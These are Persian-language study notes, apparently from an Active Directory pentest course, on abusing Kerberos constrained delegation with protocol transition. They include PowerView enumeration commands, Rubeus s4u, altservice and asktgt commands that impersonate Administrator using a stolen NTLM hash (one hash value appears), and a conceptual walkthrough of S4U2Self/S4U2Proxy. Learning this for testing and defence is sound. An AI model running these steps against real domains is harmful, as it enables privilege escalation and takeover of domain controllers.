

---

## **Constrained Delegation چیه؟**

برخلاف Unconstrained که سرویس می‌تونست به **همه جا** دسترسی پیدا کنه، اینجا سرویس فقط می‌تونه به **سرویس‌های مشخص‌شده** دسترسی داشته باشه.

این لیست سرویس‌ها توی attribute به اسم `msDS-AllowedToDelegateTo` ذخیره میشه.

---

## **دو نوع Constrained Delegation:**

### **1. بدون Protocol Transition (معمولی):**
- یوزر باید اول با Kerberos authenticate بشه
- سرویس نمی‌تونه خودش TGT بسازه

### **2. با Protocol Transition (خطرناک‌تر):**
- فلگ `TRUSTED_TO_AUTH_FOR_DELEGATION` فعاله
- سرویس می‌تونه **به نمایندگی از هر یوزری** (حتی بدون اینکه اون یوزر authenticate شده باشه) به سرویس‌های مجاز دسترسی پیدا کنه
- از **S4U2Self** و **S4U2Proxy** استفاده می‌کنه

---

## **پیدا کردن Constrained Delegation:**

```powershell
# پیدا کردن computerها
Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto

# پیدا کردن userها
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
```


![[Pasted image 20260430235046.png]]

یا با LDAP filter:

```powershell
Get-ADComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" -Properties msDS-AllowedToDelegateTo
```

---

## **Exploitation:**

فرض کن یه service account پیدا کردی که:
- `msDS-AllowedToDelegateTo` = `cifs/DC.prod.corp1.com`
- `TRUSTED_TO_AUTH_FOR_DELEGATION` فعاله

**مراحل حمله:**

### **1. گرفتن hash/password سرویس:**
اگه سرویس رو compromise کردی، hash یا password رو داری.

### **2. استفاده از Rubeus برای S4U:**

```powershell
.\Rubeus.exe s4u /user:serviceaccount$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/DC.prod.corp1.com /ptt
```

**پارامترها:**
- `/user` → نام service account
- `/rc4` → NTLM hash سرویس (یا `/aes256` برای AES key)
- `/impersonateuser` → یوزری که می‌خوای جاش رو بگیری (مثلاً Administrator)
- `/msdsspn` → سرویسی که توی `msDS-AllowedToDelegateTo` هست
- `/ptt` → تیکت رو مستقیماً inject کن

### **3. دسترسی به سرویس:**

```powershell
dir \\DC.prod.corp1.com\c$
```

---

## **نکته مهم - SPN Hijacking:**

اگه `msDS-AllowedToDelegateTo` فقط یه سرویس خاص رو داشته باشه (مثلاً `time/DC.prod.corp1.com`)، می‌تونی **SPN رو عوض کنی** و به سرویس‌های دیگه دسترسی پیدا کنی:

```powershell
.\Rubeus.exe s4u /user:serviceaccount$ /rc4:HASH /impersonateuser:Administrator /msdsspn:time/DC.prod.corp1.com /altservice:cifs,ldap,host /ptt
```

چون Kerberos فقط **hostname** رو چک می‌کنه، نه نوع سرویس!

---

## **S4U2Self و S4U2Proxy چیه؟**

- **S4U2Self:** سرویس می‌تونه **به نمایندگی از یه یوزر** یه تیکت برای خودش بگیره
- **S4U2Proxy:** سرویس می‌تونه اون تیکت رو به **سرویس دیگه‌ای** forward کنه

---

## **تفاوت با Unconstrained:**

| Unconstrained | Constrained |
|---------------|-------------|
| TGT یوزر ذخیره میشه | TGT ذخیره نمیشه |
| به همه سرویس‌ها دسترسی | فقط به سرویس‌های مشخص‌شده |
| نیاز به اتصال یوزر | نیاز به hash/password سرویس |

---


بله! این دقیقاً **جریان کامل Constrained Delegation با Protocol Transition** هست.

---

## **سناریو:**

فرض کن یه **وب‌سرور (frontend)** داری که یوزرها با **HTTP authentication** (نه Kerberos) بهش وصل میشن، ولی این وب‌سرور باید به یه **دیتابیس (backend)** با **Kerberos** دسترسی پیدا کنه.

مشکل: یوزر با Kerberos authenticate نشده، پس TGS نداره!

**راه‌حل:** Protocol Transition با S4U2Self و S4U2Proxy

---

## **مراحل به ترتیب:**

### **1️⃣ S4U2Self - گرفتن تیکت برای خودت:**

Frontend Service → KDC: "من می‌خوام یه TGS برای یوزر 'Alice' برای خودم (frontend) بگیرم"

ادامهٔ توضیح به‌صورت کاملاً روشن و مرحله‌به‌مرحله:

---

## **1️⃣ S4U2Self – سرویس فرانت‌اند به‌جای کاربر برای *خودش* تیکت می‌گیرد**

وقتی کاربر بدون Kerberos لاگین کرده (مثلاً با فرم HTML یا Basic Auth)، فرانت‌اند هیچ تیکتی از کاربر ندارد.  
پس سرویس از KDC می‌خواهد:

«به من یک TGS برای کاربر *Alice* بده، اما مقصد تیکت *خود من* هستم.»

نتیجه:

KDC یک **service ticket برای frontend** صادر می‌کند، انگار کاربر واقعاً با Kerberos لاگین کرده بوده.

این یعنی سرویس می‌تونه هویت Alice را شبیه‌سازی کنه **اما فقط در حد دسترسی به خودش**.

---

## **2️⃣ سرویس فرانت‌اند حالا یک TGS معتبر به‌نام کاربر دارد**

این تیکت اجازه می‌دهد سرویس فرانت‌اند بگوید:
«من اکنون به نمایندگی از Alice هستم.»

اما هنوز اجازه دسترسی به backend ندارد.

---

## **3️⃣ S4U2Proxy – درخواست تیکت برای سرویس بک‌اند**

فرانت‌اند حالا می‌گوید:

«KDC، حالا که یک تیکت برای من صادر کردی، من می‌خواهم به نمایندگی از Alice به سرویس بک‌اند هم دسترسی داشته باشم.  
پس یک TGS برای backend صادر کن.»

شرط مهم:

backend باید در لیست  
`msDS-AllowedToDelegateTo`  
سرویس فرانت‌اند باشد.

---

## **4️⃣ KDC یک تیکت برای backend صادر می‌کند**

KDC بررسی می‌کند که فرانت‌اند اجازه delegation دارد.  
اگر بله:

یک **service ticket برای backend به نام Alice** صادر می‌شود.

ولی این تیکت را به فرانت‌اند می‌دهد (نه به خود Alice).

---

## **5️⃣ دسترسی به backend**

فرانت‌اند حالا:

- تیکت backend را inject می‌کند یا در request می‌گذارد  
- به backend وصل می‌شود  
- backend هم فکر می‌کند **Alice** دارید به او وصل می‌شود

در نتیجه:

«سرویس فرانت‌اند اکنون با هویت Alice به backend دسترسی دارد.»

---

## **جمع‌بندی کوتاه:**

- **S4U2Self:** گرفتن تیکت برای خود سرویس (جهت impersonation بدون Kerberos از سمت کاربر)
- **S4U2Proxy:** گرفتن تیکت برای سرویس دیگر (delegation واقعی به backend)
- **خروجی:** سرویس فرانت‌اند می‌تواند به نمایندگی از کاربر، به backend متصل شود—even اگر کاربر اصلاً Kerberos استفاده نکرده باشد.
![[Pasted image 20260430235521.png]]


این دستور Rubeus داره یک **TGT (Ticket Granting Ticket)** برای یوزر `iissvc` می‌گیره.

---

## **تحلیل دستور:**

```powershell
.\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05c425E
```


![[Pasted image 20260501000212.png]]

### **پارامترها:**

- **`asktgt`**: از KDC درخواست TGT می‌کنه
- **`/user:iissvc`**: برای یوزر `iissvc` (احتمالاً یک service account)
- **`/domain:prod.corp1.com`**: در دامنه مشخص‌شده
- **`/rc4:...`**: با استفاده از **NTLM hash** یوزر (به جای پسورد)

---

## **چرا این کار رو می‌کنه؟**

چون مهاجم:

1. **هش یوزر `iissvc` رو دزدیده** (مثلاً با Mimikatz از LSASS)
2. حالا می‌خواد **بدون داشتن پسورد** یک TGT بگیره
3. این TGT رو بعداً برای **S4U2Self** و **S4U2Proxy** استفاده می‌کنه تا به سرویس‌های دیگه دسترسی پیدا کنه

---

## **مرحله بعدی (S4U attack):**

بعد از گرفتن TGT، مهاجم می‌تونه:


![[Pasted image 20260501000200.png]]

```powershell
.\Rubeus.exe s4u /ticket:[base64_TGT] /impersonateuser:Administrator /msdsspn:cifs/target.prod.corp1.com /ptt
```

این دستور:

- **S4U2Self**: تیکت برای خود `iissvc` به نام `Administrator` می‌گیره
- **S4U2Proxy**: تیکت برای سرویس `cifs/target.prod.corp1.com` به نام `Administrator` می‌گیره
- **`/ptt`**: تیکت رو مستقیماً inject می‌کنه (Pass-the-Ticket)

نتیجه: مهاجم با هویت Administrator به سرور target دسترسی پیدا می‌کنه.

---
![[Pasted image 20260501000240.png]]


![[Pasted image 20260501000255.png]]

![[Pasted image 20260501000326.png]]

![[Pasted image 20260501000341.png]]
